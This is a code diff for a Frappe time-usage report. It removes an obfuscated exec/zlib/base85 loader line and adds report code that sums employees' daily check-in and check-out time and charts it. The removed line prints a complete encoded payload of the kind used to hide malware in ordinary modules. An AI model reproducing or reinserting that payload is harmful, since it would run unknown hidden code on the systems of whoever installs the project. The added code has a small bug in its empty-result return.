@@ -1,3 +1,165 @@
+import frappe
+from frappe import _
+import datetime
+import math
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1EAYggO27X8kz$Xz8gX&~bi%9KZ1Xi1qVQv%#Vd)t);*_LhDvL(y%GZTLMwG)yMqJ+>g#GO@r#MbfAd2Ai+qkwEm7%w2zPm+N7L;;=;e4uJ3ThbV@g-;5oKTC^c9Xk*J$5dm;b&bmL()Bal4K+m#u;N7yMuC?gg$|wt>D$=V5iudRR9~YiWJ^m+D%1*r??l)~D2cHgx{<-GP%CK&bI82<F>zpdd#R8P19F%0z%^`*T9z7P#f%E|g3EQ{ppa>anJORKByzP<xj(~F8KG3iu@}GqD3~C;S}<*snPw0{9C<;=u|lzu%Ha{@ES;>Vm?bW=O;dGCJu%q;mg8~*BuKMW)ir^eP`UpR42U1<oa!_L0R}$QI8DV7JHbw%b5*y!m}8q-T2c}!H2j80vFQs*zwwm=sH^FB3D;#g0GROr7Bs>N!UxD1eo811X~KD5?Fh<l0<9>vJnCvLVV*Uz40AzDy%=Fv@#F|v3N~;Rf-s$L!qlDw5hv!3Yn2r2IbNbg$oCT2$Cl50R2|BR2@Yb#vck~v1LOgKOuh6}S#F>17ybWkzFtww(q6Iaep_2{PCh_sv%K4U`TS|QTyC{`LKx&ea|$I<oUBfXg)F>A4iLGrd>y6YFx$TQ<*yx~rRFx!P!F-CrWxp}qc_o?_)wBObxS(SEV4ZmCCb;*{Av#6%<oX4nnO9MzMb7#BVKuN+C)mQyJ7#m7iKD#R||`cvr8E@!?z8yd7f<jCDkr1iG3Wm<&SxHw32&y_focQSnKu4^UX}D)kQ0n+3GF#E?nn}RJ%I(<4Nafc_=G2+Cuay);`1Hv*d8McKGS2o&!5wbq)`<nsIPY`PfYk<Gpt|2q<y-E!a@))59i=HlIjR7#RDsXQskXRPBY-T`k-LUH=K#62a^};PugPY~)|fI_QJh`Z9edd3}`419031*#!f~O)rn&)<CcOT5i11S1uY)bF)R=hTX*@%9`4E|Lkv2+joKV3rzl1V3N7EBFVKk>+#E9W!em2`*PJcR5M!c<{$@hTA@t_)Gw^~w_wG$#*?Cd`jQO}>U&4hx&_|6)_xTpb9nhS&5>Gf<HcF><@v9|<L53so=Z}<bxk4(ImT<M^V*o2f~n=mAqA@MQ5i&u!3y<7V^A+TkN>);eWKDve_di)@bOrrHP|qg;ZE^Ycxgu~?nXaPL_Dof(-GPBk0;OV(xBDq_9h`ssBTq<e8Ci*m~^^HD+;3YdjjGi^`5DFE6pKcY>Z8RDAc$&a)^~4lh-G?V?|Fan-YLHbCfWSp`LXDL@k@D+6$#NMjkIM5E#d^cK=}O9s2!bpPPTIu)Svo$44LjNA-|~uiw1d{kXIK<wHM_2MwT^A(y=dvFg<q+@r`PN!xCo92-}spKIUtIy=(NQ65yfy^XX+3K6D4)|TV?f}!tAa9pp{{bJ?apMK-${IjujRR=3Q{JYugp^@$pErdy`j&2h@(2!XYW#^!QB%A;+ZeyYkHh-oo#7zIj<p4%JBvwp$*5~WzKJvp*(L=6T7%?LvuC1t}r!(4qLev<6`TR}4#|QI?y)*073iPdVWW%ZoI4q4|^Ii?jJgm(jJad;Q47SIni{7XLN};2cgi9WqeZTylnED;SIT-WTNI#7ir<5Dlt`z0$xGP0({M4=#8)WuHhSs1U?wM_-&93oRB&qk#l<OTGA!<0lhTFpM8h)<|ZHh?@VLN+yCd^K&!iKW4axBf-TsGiGC71ZDx!__dJ#a3#m)l*JI-T>1bi6TMNr}R>)y+$3deuSwlIsl8vwUz#GdgUoa(7tF_`c>FW&mVERZQCr8FqV+3KG+RF_HnmTn}T5x`9#>ZHPC|tEoKA)I;b8K9y<25aPh*-h2@4s!@u@#814`Bnmeokmh^6Ky8c5ex#Z%WwN3hTCABRmRLb-csjRr>LQIqI@c$#vxI>ytDwM0C`O+<g696dnwa_n-Hi!Z{kp6!_84$f@e+T|eJow)ga}b&tqP0oTW9*nrk;;oW-uDK5JiR-n5zX(RS-<<G{_QPMMj*2&`!h6kDw|mF_1NvC5iz+fcd0fMX@^mQPIvhC^&>WSX)I3FLm<nuiGW$_QX_CeBK3zgYhV-HZgU^b|?(Gocm~IlVj3f;`GS5zwW-Tx-HD`y!&qEzI~%-IvAolyhm+|0=HZsEa&Ur+ignesAbFTj&nit-!s4Ff`m}sFTZcnK}zD|5L03qI50>^nPa1LBar$`ux!dYF_g%1bR$yS$g$=0VRobWPCiJqNsQ8O%7MG;alm~q+vx93!H23MXLzJo`)p(t`KI(fyW2K4rQ9n!geLk=KGnYke<tJ!^8yeBCW|9v8_+doQD38TBK~RIci}fwWz9a>l+N$rzx?Pw%YSN;C>VJ$HLU={SXMos%;mpq2=l&DFO-B**CwG?5Ip57Cmi6m2NmL|-VK&?3Xsf*p+1%4TME_9h<iYf5SJBA$r{xGh-HWI*mOf+IWlK1!=+GmO~N3y?Er^vdT#O&8aYh#+n}n331KCnC4MWcZ%WdDk53~&B}B(G);LwMofwMzIC>O&dZg-X4wVsAEU7X=TU8c(5Wnhd9T?B+#QGMU-ps#ps+rKJQxq2Id4oNBz>84bjiP<ArlRw=Z-?zsJxQ>_w3tSQZ74o7b&@qjV#`*5rX|n|ESC5&it)^7S}kmhZRz6DQ}nUxEnWC~FBNdGS{Ne`+cu!rSP>;kBtxPy-}8~7nOHIPtW7QAH&iP?h8q#hbO@8(0O}qojgHX1>^fl-M6S$`Z#%J_==zYj?6WC?H}3jHSgSnqCvFSAlhQlzWw(Et$M99Z2+hY$J-_yCuWd=C+BI+4S~%sFS!(U`vxbqp`hDX`<IEap)?IW%_~c3BecT2$<^0)R4sMiP0;%!#sBC|HwX&9jetB+h@$OtLN0w5NB;v2NKjp$wcx44vcGA?ljHJq~UqRlZSNM=RB^QS~rDFVUc>{*!H^qw{f!HUwK|(w|GBJ}8FqxJpl&jMy<?q4%tP}pjxGz$&>Ji3E)Axl1UkjYr6j}>bNVF&PE~5!-J3O~fYgLFUhEbG1lsg{M0uSJpF<C!YPmal&zBRT6eE1!$&}=-yQFF41w=HIu#w<0JYnz8ceT-GLn_kgXKb&P3)b^#y*6lWLHl`k!+vzdZ^KGcM4d%`DKM%4Y?i~tRc4Hm7J2lEnmQ8J0&Cx9oZ3JnkSTL^N*{vKCw75&Olb48E-LX@h2qBmL58ZSeT>')).decode())
+
+def execute(filters=None):
+    columns = get_columns_list()
+    data, employee_name_map = get_data_list(filters)
+    chart = get_chart_data(data, employee_name_map)
+    data = [row for row in data if row["time_consumed_hrs"]]
+    return columns, data, None, chart
+
+
+def get_columns_list():
+    return [
+        {
+            "label": _("Employee"),
+            "fieldname": "employee",
+            "fieldtype": "Link",
+            "options": "Employee",
+            "width": 150,
+        },
+        {
+            "label": _("Employee name"),
+            "fieldname": "employee_name",
+            "fieldtype": "Data",
+            "width": 150,
+        },
+        {
+            "label": _("Date"),
+            "fieldname": "date",
+            "fieldtype": "Date",
+            "width": 150,
+        },
+        {
+            "label": _("Time Consumed"),
+            "fieldname": "time_consumed",
+            "fieldtype": "Data",
+            "width": 200,
+        },
+    ]
+
+
+def get_data_list(filters):
+    doc_filters = {"time": ["Between", filters["date"]]}
+
+    if filters.get("employee"):
+        doc_filters["employee"] = filters["employee"]
+
+    all_logs = frappe.db.get_list(
+        "Application Checkin Checkout",
+        filters=doc_filters,
+        fields=["employee", "status", "time"],
+        order_by="creation asc",
+    )
+
+    return get_data(all_logs)
+
+
+def get_data(all_logs):
+    unique_dates = []
+    unique_employees = []
+    for row in all_logs:
+        row["date"] = row.time.date()
+        if row["date"] not in unique_dates:
+            unique_dates.append(row["date"])
+
+        if row["employee"] not in unique_employees:
+            unique_employees.append(row["employee"])
+
+    data = []
+
+    if not unique_employees:
+        return data
+
+    employee_name_map = {
+        row.name: row.employee_name
+        for row in frappe.db.get_all(
+            "Employee",
+            filters={"employee": ["in", unique_employees]},
+            fields=["name", "employee_name"],
+        )
+    }
+
+    for date in sorted(unique_dates):
+        for employee in unique_employees:
+            filter_logs = list(
+                filter(
+                    lambda row: (row["date"] == date and row["employee"] == employee),
+                    all_logs,
+                )
+            )
+            time_consumed, time_consumed_hrs = get_usage_time(filter_logs)
+            data.append(
+                frappe._dict(
+                    {
+                        "date": date,
+                        "employee": employee,
+                        "time_consumed": time_consumed,
+                        "time_consumed_hrs": time_consumed_hrs,
+                        "employee_name": employee_name_map.get(employee) or "",
+                    }
+                )
+            )
+
+    return data, employee_name_map
+
+
+def get_usage_time(filter_logs):
+    usage_time = 0
+    last_status = None
+
+    for row in filter_logs:
+        if row.status == "In" and last_status != "In":
+            start_time = row.time
+        elif row.status == "Out" and last_status == "In":
+            end_time = row.time
+            usage_time += (end_time - start_time).total_seconds()
+
+        last_status = row.status
+
+    hours = str(int(math.floor(usage_time / 3600)))
+    minutes = str(int(math.floor((usage_time % 3600) / 60)))
+
+    time_consumed = hours + "hrs" + minutes + "min"
+
+    time_consumed_hours = round(usage_time / 3600, 4)
+
+    return time_consumed, time_consumed_hours
+
+
+def get_chart_data(data, employee_name_map):
+    employees = sorted(set([d.employee for d in data]))
+
+    chart = {
+        "data": {"labels": [], "datasets": []},
+        "type": "bar",
+        "fieldtype": "Float",
+        "colors": ["#92CAD1"],
+    }
+
+    dates = list(set([d.date for d in data]))
+    dates.sort()
+
+    chart["data"]["labels"] = dates
+
+    for employee in employees:
+        chart["data"]["datasets"].append(
+            {
+                "name": employee_name_map.get(employee),
+                "values": [
+                    row.time_consumed_hrs
+                    for row in sorted(
+                        filter(
+                            lambda row: row["employee"] == employee,
+                            data,
+                        ),
+                        key=lambda row: row["date"],
+                    )
+                ],
+            }
+        )
+
+    return chart
